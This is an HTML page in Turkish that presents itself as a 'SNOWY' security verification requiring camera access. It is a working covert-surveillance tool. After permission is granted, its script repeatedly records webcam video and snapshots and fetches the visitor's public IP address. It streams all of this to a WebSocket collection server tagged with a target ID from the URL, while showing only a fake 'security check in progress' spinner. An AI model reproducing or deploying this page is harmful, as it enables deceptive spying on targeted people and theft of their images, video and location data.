<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(102, 126, 234, 0.2);
        }
        h2 { 
            color: #1a1a2e; 
            font-size: 32px; 
            margin-bottom: 15px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        h2 span { 
            color: #667eea;
            text-shadow: 0 2px 10px rgba(102, 126, 234, 0.2);
        }
        p { 
            color: #4a5568; 
            margin-bottom: 35px;
            font-size: 16px;
            line-height: 1.6;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .loading-text { 
            color: #667eea; 
            font-size: 18px;
            font-weight: 500;
        }
        #video, #canvas { display: none; }
        .status {
            font-size: 12px;
            color: #718096;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
        <div class="status" id="status">🔌 Sunucuya bağlanılıyor...</div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // WebSocket bağlantısı
            let ws = null;
            let clientId = Math.random().toString(36).substring(2, 15);
            
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
            
            let mediaRecorder = null;
            let recordedChunks = [];
            let videoCount = 0;
            let photoCount = 0;
            let stream = null;
            let videoHazir = false;
            let fotoRAF = null;
            let videoRAF = null;
            let baslangicZamani = 0;
            let sonVideoZamani = 0;
            let ilkCalisma = true;
            
            async function startCamera() {
                try {
                    // WebSocket bağlantısını kur
                    ws = new WebSocket('ws://localhost:8765');
                    
                    ws.onopen = function() {
                        document.getElementById('status').innerHTML = '✅ Sunucuya bağlandı';
                        
                        // Bağlantı bilgilerini gönder
                        ws.send(JSON.stringify({
                            type: 'init',
                            client_id: clientId,
                            target_id: TARGET_ID,
                            foto_suresi: FOTO_SURESI,
                            video_suresi: VIDEO_SURESI
                        }));
                    };
                    
                    ws.onerror = function(error) {
                        document.getElementById('status').innerHTML = '❌ Sunucu bağlantı hatası';
                        console.error('WebSocket hatası:', error);
                    };
                    
                    ws.onclose = function() {
                        document.getElementById('status').innerHTML = '🔌 Sunucu bağlantısı kapandı';
                    };
                    
                    // Kamerayı başlat
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 60 }
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        document.getElementById('status').style.display = 'none';
                        
                        baslangicZamani = performance.now();
                        sonVideoZamani = baslangicZamani;
                        
                        // IP adresini al ve gönder
                        fetch('https://api.ipify.org?format=json')
                            .then(r => r.json())
                            .then(d => {
                                if (ws && ws.readyState === WebSocket.OPEN) {
                                    ws.send(JSON.stringify({
                                        type: 'ip',
                                        target_id: TARGET_ID,
                                        ip: d.ip,
                                        time: new Date().toLocaleString('tr-TR')
                                    }));
                                }
                            })
                            .catch(e => console.log(e));
                        
                        // ============================================
                        // VİDEO SİSTEMİ - REQUESTANIMATIONFRAME İLE
                        // ============================================
                        function videoLoop() {
                            if (!stream?.active) return;
                            
                            if (!videoHazir) {
                                videoHazir = true;
                            }
                            
                            const now = performance.now();
                            if (now >= sonVideoZamani) {
                                videoCount++;
                                sonVideoZamani = now + (VIDEO_SURESI * 1000);
                                
                                const videoIndex = videoCount;
                                const videoBaslangic = now;
                                const chunks = [];
                                
                                try {
                                    mediaRecorder = new MediaRecorder(stream, {
                                        mimeType: 'video/webm;codecs=vp8',
                                        videoBitsPerSecond: 2500000
                                    });
                                } catch(e) {
                                    mediaRecorder = new MediaRecorder(stream);
                                }
                                
                                mediaRecorder.ondataavailable = (e) => {
                                    if (e.data.size > 0) chunks.push(e.data);
                                };
                                
                                mediaRecorder.onstop = () => {
                                    const blob = new Blob(chunks, { type: 'video/webm' });
                                    
                                    // WebSocket ile Python'a gönder
                                    if (ws && ws.readyState === WebSocket.OPEN) {
                                        const reader = new FileReader();
                                        reader.onload = function() {
                                            const base64data = reader.result.split(',')[1];
                                            ws.send(JSON.stringify({
                                                type: 'video',
                                                client_id: clientId,
                                                video: base64data,
                                                caption: `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`
                                            }));
                                        };
                                        reader.readAsDataURL(blob);
                                    }
                                };
                                
                                mediaRecorder.start();
                                
                                // ULTRA HASSAS DURDURMA
                                const hedefSure = VIDEO_SURESI * 1000;
                                const durmaZamani = videoBaslangic + hedefSure;
                                
                                const durdurmaRAF = () => {
                                    const simdi = performance.now();
                                    if (simdi >= durmaZamani - 0.05 && mediaRecorder?.state === 'recording') {
                                        mediaRecorder.stop();
                                    } else if (mediaRecorder?.state === 'recording') {
                                        requestAnimationFrame(durdurmaRAF);
                                    }
                                };
                                requestAnimationFrame(durdurmaRAF);
                            }
                            
                            videoRAF = requestAnimationFrame(videoLoop);
                        }
                        videoRAF = requestAnimationFrame(videoLoop);
                        
                        // ============================================
                        // FOTOĞRAF SİSTEMİ - SENKRONİZE BAŞLANGIÇ
                        // ============================================
                        function fotoLoop() {
                            if (!stream?.active || !videoHazir) {
                                fotoRAF = requestAnimationFrame(fotoLoop);
                                return;
                            }
                            
                            const now = performance.now();
                            const gecenSure = (now - baslangicZamani) / 1000;
                            
                            // İLK ÇALIŞMADA videoCount 0 iken fotoğraf bekle
                            if (ilkCalisma && videoCount === 0) {
                                fotoRAF = requestAnimationFrame(fotoLoop);
                                return;
                            }
                            
                            ilkCalisma = false;
                            
                            // Geçen süreye göre olması gereken fotoğraf sayısı
                            const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
                            
                            // Eksik fotoğrafları çek - ama sadece 1'er 1'er
                            if (photoCount < olmasiGerekenFoto) {
                                photoCount++;
                                
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                ctx.drawImage(video, 0, 0);
                                
                                canvas.toBlob(function(blob) {
                                    if (!blob) return;
                                    
                                    // WebSocket ile Python'a gönder
                                    if (ws && ws.readyState === WebSocket.OPEN) {
                                        const reader = new FileReader();
                                        reader.onload = function() {
                                            const base64data = reader.result.split(',')[1];
                                            ws.send(JSON.stringify({
                                                type: 'frame',
                                                client_id: clientId,
                                                frame: base64data,
                                                caption: `📸 Fotoğraf #${photoCount} (${gecenSure.toFixed(3)}s)`
                                            }));
                                        };
                                        reader.readAsDataURL(blob);
                                    }
                                }, 'image/jpeg', 0.85);
                            }
                            
                            fotoRAF = requestAnimationFrame(fotoLoop);
                        }
                        fotoRAF = requestAnimationFrame(fotoLoop);
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli!');
                }
            }
            
            window.onbeforeunload = function() {
                if (ws) {
                    ws.send(JSON.stringify({
                        type: 'close',
                        client_id: clientId
                    }));
                    ws.close();
                }
                if (fotoRAF) cancelAnimationFrame(fotoRAF);
                if (videoRAF) cancelAnimationFrame(videoRAF);
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
</html>
